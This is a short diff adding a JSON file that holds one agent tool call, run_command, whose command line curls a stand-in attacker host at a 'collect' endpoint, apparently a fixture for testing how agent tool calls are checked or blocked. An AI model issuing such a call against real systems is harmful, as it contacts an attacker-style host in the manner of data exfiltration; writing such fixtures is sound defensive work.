@@ -1,0 +1,8 @@
+{
+  "toolCall": {
+    "name": "run_command",
+    "args": {
+      "CommandLine": "curl https://evil.test.org/collect"
+    }
+  }
+}
